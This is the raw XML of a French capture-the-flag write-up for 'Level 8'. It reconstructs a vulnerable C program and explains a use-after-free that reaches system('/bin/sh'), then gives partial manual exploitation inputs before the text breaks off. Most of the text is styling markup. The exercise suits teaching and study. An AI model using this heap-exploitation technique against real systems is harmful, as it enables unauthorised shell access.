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4E700002550E0CF0A0B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700007834000008119D8F4F51.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000411E000024B20BD4F334.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000046B300001443D6C79D5F.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000471C00000D718E4495CF.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000501A00001A271B91861C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000506A00000D3CB67F13D6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003B3A00000E5F8CCD1900.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005ABF00002E34A9B0823D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004B8E00002536A8737C8B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003BA3000004233957365B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001F52000007DCBA0DA491.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001F3700000A8CF49052A6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000420C000010F48848D86E.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005CD100000F67005BA9BD.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004A0100001689B8FD0953.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000030FE00001A5C9CAFFBFF.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000427600000B457A248AC0.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000350600002ACBEB1EBFE0.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004FB00000237471BA68F1.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000044F100000EFD3837946C.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000536900001A914AEBB3B7.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000044D600003BBE79DDBD64.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700002C5800000B5F1CA71990.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005DBF000028007C0F4AAA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700001AC600000B45B2AE05DA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000029580000184B814AA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Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11"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d0d0d0"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P14"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style-complex="normal"/>
    </style:style>
    <style:style style:name="P15"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weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P20"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21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard"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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard"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29" style:family="paragraph" style:parent-style-name="Standard"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7" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P4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list-style-name="L3">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list-style-name="L5">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list-style-name="L7">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list-style-name="L9">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color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#6ab825" style:text-underline-style="none" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#d0d0d0" style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="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447fcf"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11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color="#ba2121"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#ba2121" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#19177c"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#19177c" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#666666"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:color="#666666" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#008000" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:color="#008000" fo:font-weight="bol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03422532962728299" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P24">Level 8</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">On reconstruit le code source suivant :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P12">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">*service;</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">*auth;</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">buff[</text:span><text:span text:style-name="T10">128</text:span><text:span text:style-name="T4">];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*authstr</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"auth "</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*resetstr</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"reset"</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*servstr</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"service"</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*loginstr</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">"login"</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">k</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="4"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">printf(</text:span><text:span text:style-name="T11">"%p, %p\n"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">service,</text:span> <text:span text:style-name="T4">auth);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(fgets(buff,</text:span> <text:span text:style-name="T10">128</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">stdin)</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(buff[i]</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T4">authstr[i]</text:span> <text:span text:style-name="T4">&amp;&amp;</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span> <text:s text:c="11"/><text:tab/><text:tab/><text:span text:style-name="T6">// AUTH</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*s</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">malloc(</text:span><text:span text:style-name="T10">0x4</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">auth</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">*s</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(buff[i])</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="16"/><text:span text:style-name="T4">k++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="16"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(k</text:span> <text:span text:style-name="T4">&lt;=</text:span> <text:span text:style-name="T10">0x1e</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="16"/><text:span text:style-name="T4">strcpy(auth,</text:span> <text:span text:style-name="T4">&amp;buff[</text:span><text:span text:style-name="T10">4</text:span><text:span text:style-name="T4">]);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(buff[i]</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T4">resetstr[i]</text:span> <text:span text:style-name="T4">&amp;&amp;</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span> <text:s text:c="11"/><text:tab/><text:span text:style-name="T6">// RESET</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">free(auth);</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P18"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(buff[i]</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T4">servstr[i]</text:span> <text:span text:style-name="T4">&amp;&amp;</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">7</text:span><text:span text:style-name="T4">)</text:span> <text:s text:c="11"/><text:tab/><text:tab/><text:span text:style-name="T6">// SERVICE</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">7</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">service</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">strdup(&amp;buff[</text:span><text:span text:style-name="T10">6</text:span><text:span text:style-name="T4">]);</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span> <text:s text:c="27"/><text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T6">// LOGIN</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(buff[i]</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T4">loginstr[i]</text:span> <text:span text:style-name="T4">&amp;&amp;</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(i</text:span> <text:span text:style-name="T4">==</text:span> <text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">((auth</text:span> <text:span text:style-name="T4">+</text:span> <text:span text:style-name="T10">0x20</text:span><text:span text:style-name="T4">)</text:span> <text:span text:style-name="T4">!=</text:span> <text:span text:style-name="T10">0x0</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="16"/><text:span text:style-name="T4">system(</text:span><text:span text:style-name="T11">"/bin/sh"</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="12"/><text:span text:style-name="T1">else</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="16"/><text:span text:style-name="T4">fwrite(</text:span><text:span text:style-name="T11">"Password:\n"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0x1</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T10">0xa</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">stdout);</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="4"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P18"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P18"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P11">}</text:p>
      <text:p text:style-name="P2">La difficulté dans la reconstruction de ce code source était les séries d'instructions qui permettaient de comparer les chaînes de caractères. On tombait en effet de manière répétée sur ce schéma :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="20.311cm" svg:height="10.343cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700005ABF00002E34A9B0823D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>(Plus précisément sur <text:span text:style-name="T3">seta </text:span><text:span text:style-name="T12">et </text:span><text:span text:style-name="T3">setb</text:span><text:span text:style-name="T12">, seta place le byte à 01 si </text:span><text:span text:style-name="T3">ZF et CF </text:span><text:span text:style-name="T12">sont à 0 (donc supérieur ET non-égal) ; setb place le byte à 01 si </text:span><text:span text:style-name="T3">CF </text:span><text:span text:style-name="T12">est à 0 (strictement inférieur). Pour voir l'état de ces registres flag, </text:span><text:span text:style-name="T3">info registers eflags </text:span><text:span text:style-name="T12">dans GDB).</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Bref, le schéma présenté ci-dessus était répété 4 fois, en comparant l'input utilisateur avec les chaînes suivantes :</text:p>
      <text:list xml:id="list2276258557156490885" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P31"><text:soft-page-break/>"auth "</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">"reset"</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">"service"</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">"login"</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4">Si l'input utilisateur correspondait, une action différente était chaque fois effectuée.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; Dans le cas de "auth ", on allouait une chaîne de caractère </text:span><text:span text:style-name="T3">s </text:span><text:span text:style-name="T12">de </text:span><text:span text:style-name="T3">4 bytes</text:span><text:span text:style-name="T12">, et on plaçait le pointeur désignant cette chaîne dans la variable globale </text:span><text:span text:style-name="T3">auth</text:span><text:span text:style-name="T12">. On prenait ensuite tout ce qui suivait "auth :" dans l'input utilisateur, et si cela n'était pas trop long (supérieur à 0x1e), on copiait le reste de l'input dans la chaîne </text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:x="0.005cm" svg:y="0.222cm" svg:width="10.583cm" svg:height="6.219cm" draw:z-index="1"><draw:image xlink:href="Pictures/20000007000029580000184B814AA668.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; Dans le cas de "reset", on libère le pointeur </text:span><text:span text:style-name="T3">auth </text:span><text:span text:style-name="T12">(donc l'adresse contenue dans auth). </text:span><text:span text:style-name="T3">LE POINTEUR AUTH N'EST CEPENDANT PAS RÉINITIALISÉ </text:span><text:span text:style-name="T12">après ce free. Il continue donc de pointer vers une zone mémoire (ici 0x804a9c0) qui ne sera cependant plus allouée (et pourra donc potentiellement être utilisée par une autre variable allouée dynamiquement).</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; Dans le cas de "service", on alloue sur la heap (sans limite de taille) une chaîne de caractères contenant tout ce qui suit "service" dans l'input utilisateur </text:span><text:span text:style-name="T3">fgets</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; Dans le cas de "login", si l'espace mémoire situé 0x20 bytes après le pointeur </text:span><text:span text:style-name="T3">auth </text:span><text:span text:style-name="T12">n'est pas à </text:span><text:span text:style-name="T3">0x00</text:span><text:span text:style-name="T12">, on exécute </text:span><text:span text:style-name="T3">system("/bin/sh")</text:span><text:span text:style-name="T12">. Sinon, on affiche un prompt de mot de passe.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">&gt;&gt; <text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P36"/>
      <text:list xml:id="list7725382956651594715" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P32">Entrer un premier input :</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P43">auth AAAA</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list4515443122077670518" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P37"><text:span text:style-name="T12">Celui-ci placera dans </text:span><text:span text:style-name="T3">auth </text:span><text:span text:style-name="T12">l'adresse 0x804a9c0 (et à cette adresse, la chaîne "AAAA" mais cela importe peu).</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list3013580953987103686" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P33">Entrer un second input :</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P44">reset</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list4551131492935621334" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P38"><text:span text:style-name="T12">Cela va libérer la mémoire allouée pour la chaîne </text:span><text:span text:style-name="T3">s </text:span><text:span text:style-name="T12">dont l'adresse était 0x804a9c0.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list1444664555390352166" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P34">Entrer un troisième input :</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P45">service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list8501874480057006692" text:style-name="L8">
        <text:list-item>
